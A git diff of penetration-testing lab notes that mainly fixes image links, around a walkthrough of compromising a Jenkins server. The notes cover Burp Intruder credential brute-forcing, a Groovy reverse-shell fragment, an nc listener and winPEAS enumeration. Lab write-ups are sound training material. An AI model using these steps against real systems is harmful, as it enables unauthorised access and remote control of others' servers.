@@ -71,7 +71,7 @@ Nmap done: 1 IP address (1 host up) scanned in 524.40 seconds
 - http://192.168.64.7:8080
 
 #jenkins
-	- ![Alt](jenkins.png)
+	- ![Alt](../../Images/jenkins.png)
 
 #attackjenkins
 - https://github.com/gquere/pwn_jenkins
@@ -82,12 +82,12 @@ default credential of Jenkins is admin/password but not working
 We can brute force access it using burp suite
 
 
-![Alt](jenkins_payload.png)
+![Alt](../../Images/jenkins_payload.png)
 
 
 Send to repeater then send to intruder
 
-![Alt](repeater_to_intruder.png)
+![Alt](../../Images/repeater_to_intruder.png)
 
 #burpsuiteintruder
 #clusterbomb
@@ -101,19 +101,19 @@ Send to repeater then send to intruder
 clusterbomb - every single user with every single password
 use different combinations
 
-![Alt](cluster_bomb_spraying.png)
+![Alt](../../Images/cluster_bomb_spraying.png)
 
 
 Payload 2
 
-![[Pasted image 20240708191940.png]]
+![Alt](../../Images/cluster_bomb_spraying_payload_2.png)
 
 ![[Pasted image 20240708192040.png]]
 
 
 Check the length of the response
 
-![[Pasted image 20240708192636.png]]
+![Alt](../../Images/burp_Analyze_jsession_length_intruder.png)
 
 Here is the difference in the response
 
@@ -123,15 +123,15 @@ no session cookie, length = 315
 
 there is session cookie ; length = 309
 
-![[Pasted image 20240708192906.png]]
+![Alt](../../Images/burp_jsession_length.png)
 
 Since there is a session cookie now when we tried Jenkins as username and Jenkins as password. Let's try to log in now as jenkins/jenkins
 
 We were able to log in.
 
-![[Pasted image 20240708193156.png]]
+![Alt](../../Images/jenkins_success_login.png)
 
-![[Pasted image 20240708193449.png]]
+![Alt](../../Images/jenkins_vulnerable_groovy.png)
 
 #groovyreverseshell #revershelljenkins #exploitgroovyreverseshell
 #githubgroovyreverseshell
@@ -151,7 +151,7 @@ Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
 
 jenkins script console with reverse shell below
 
-![[Pasted image 20240708194235.png]]
+![Alt](../../Images/reverse_shell_groovy.png)
 
 Run nc -nvlp 8044 in your machine then  run the script in jenkins
 
@@ -163,7 +163,7 @@ listening on [any] 8044 ...
 ```
 
 
-![[Pasted image 20240708194618.png]]
+![Alt](../../Images/groovy_exploit_reverse_shell.png)
 
 Check `systeminfo` of the machine to enumerate
 
@@ -327,7 +327,7 @@ dir
 
 executing winpeas.exe, please see the results below
 
-![[Pasted image 20240708201429.png]]
+![Alt](../../Images/winpeas_butler.png)
 
 
 We saw executable service
